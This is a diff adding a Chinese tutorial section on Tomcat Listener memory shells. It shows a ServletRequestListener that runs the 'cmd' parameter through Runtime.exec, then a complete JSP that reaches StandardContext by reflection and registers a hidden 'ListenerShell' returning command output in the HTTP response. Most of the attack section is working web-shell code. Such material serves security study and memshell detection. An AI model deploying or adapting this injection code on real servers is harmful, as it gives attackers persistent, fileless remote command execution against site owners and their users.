@@ -21,3 +21,159 @@ Listener 的原理是基于观察者模式的，所谓的观察者模式简单�
 ## ServletRequestListener的生命周期
 
 ![image](assets/image-20250619095415-queqcu7.png)
+
+## 尝试写一个自己的Listener
+
+1. 新建一个基础web项目，并添加一个自己的Listener
+
+![image](assets/image-20250708131322-jl6ttga.png)
+
+![image](assets/image-20250708131338-pvqhh4o.png)
+
+在pom.xml中配置依赖
+
+```xml
+ <dependency>
+            <groupId>javax.servlet</groupId>
+            <artifactId>javax.servlet-api</artifactId>
+            <version>4.0.1</version>
+            <scope>provided</scope>
+        </dependency>
+        <dependency>
+            <groupId>org.apache.tomcat</groupId>
+            <artifactId>tomcat-catalina</artifactId>
+            <version>8.0.53</version>
+        </dependency>
+```
+
+添加MyListener类
+
+![image](assets/image-20250708131433-st6uxji.png)
+
+编写如下类
+
+```jsp
+package com.example.memshell;
+
+import jakarta.servlet.ServletRequest;
+import jakarta.servlet.ServletRequestEvent;
+import jakarta.servlet.ServletRequestListener;
+import java.io.IOException;
+
+public class MyListener implements ServletRequestListener {
+    public void requestInitialized(ServletRequestEvent sre) {
+      ServletRequest req = sre.getServletRequest();
+      String cmd = req.getParameter("cmd");
+      if (cmd != null) {
+          try {
+              Runtime.getRuntime().exec(cmd);
+          } catch (IOException e) {
+              throw new RuntimeException(e);
+          }
+      }
+    }
+  }
+```
+
+修改web.xml配置
+
+```xml
+<?xml version="1.0" encoding="UTF-8"?>
+<web-app xmlns="https://jakarta.ee/xml/ns/jakartaee"
+         xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
+         xsi:schemaLocation="https://jakarta.ee/xml/ns/jakartaee https://jakarta.ee/xml/ns/jakartaee/web-app_6_0.xsd"
+         version="6.0">
+    <listener>
+        <listener-class>com.example.memshell.MyListener</listener-class>
+    </listener>
+</web-app>
+```
+
+测试运行效果
+
+![image](assets/image-20250708132326-nw02ojd.png)
+
+知道了基本原理之后就需要探究如何在Web应用运行时注入Listener。
+
+在Listener方法中加入断点，并调试运行后触发断点
+
+![image](assets/image-20250708132654-ot1bemg.png)
+
+发现方法是由StandardContext.fireRequestInitEvent()调用
+
+![image](assets/image-20250708132515-9a1x91w.png)
+
+并且发现调用的Listener来自StandardContext中的applicationEventListenersList。那么事情到此就解决了。
+
+步骤如下
+
+1. 动态创建一个Listener类，
+2. 通过反射获取StandardContext.applicationEventListenersList属性
+3. 将创建的类添加进applicationEventListenersList列表
+
+那么自然会在请求时触发我们动态创建的Listener类。
+
+那么jsp怎么写呢
+
+```jsp
+<%@ page import="java.lang.reflect.*" %>
+<%@ page import="org.apache.catalina.core.*" %>
+<%@ page import="javax.servlet.*" %>
+<%@ page import="org.apache.catalina.connector.Response" %>
+<%@ page import="java.io.InputStreamReader" %>
+<%@ page import="java.io.BufferedReader" %>
+<%@ page import="org.apache.catalina.connector.Request" %>
+<%--声明一个恶意Filter--%>
+<%!
+    public class ListenerShell implements ServletRequestListener {
+        @Override
+        public void requestInitialized(ServletRequestEvent sre) {
+            ServletRequest req = sre.getServletRequest();
+            Class reqClass = req.getClass();
+            try {
+                Field field = reqClass.getDeclaredField("request");
+                field.setAccessible(true);
+                Response  resp = ((Request) field.get(req)).getResponse();
+                String cmd = req.getParameter("cmd");
+                if (cmd != null) {
+                    Process proc = Runtime.getRuntime().exec(cmd);
+                    BufferedReader br = new BufferedReader(
+                            new InputStreamReader(proc.getInputStream()));
+                    String line;
+                    while ((line = br.readLine()) != null) {
+                        resp.getWriter().println(line);
+                    }
+                    br.close();
+                }
+            } catch (Exception e) {
+                throw new RuntimeException(e);
+            }
+
+        }
+
+        @Override
+        public void requestDestroyed(ServletRequestEvent servletRequestEvent) {}
+
+
+    }
+%>
+<%--从ServletContext中获取StandardContext--%>
+<%
+    // 从request中获取servletContext
+    ServletContext servletContext = request.getServletContext();
+    // 从servletContext中获取applicationContext
+    Field applicationContextField = servletContext.getClass().getDeclaredField("context");
+    applicationContextField.setAccessible(true);
+    ApplicationContext applicationContext = (ApplicationContext) applicationContextField.get(servletContext);
+    // 从applicationContext中获取standardContext
+    Field standardContextField = applicationContext.getClass().getDeclaredField("context");
+    standardContextField.setAccessible(true);
+    StandardContext standardContext = (StandardContext) standardContextField.get(applicationContext);
+%>
+<%--动态注册恶意Listener--%>
+<%
+    standardContext.addApplicationEventListener(new ListenerShell());
+%>
+```
+
+‍
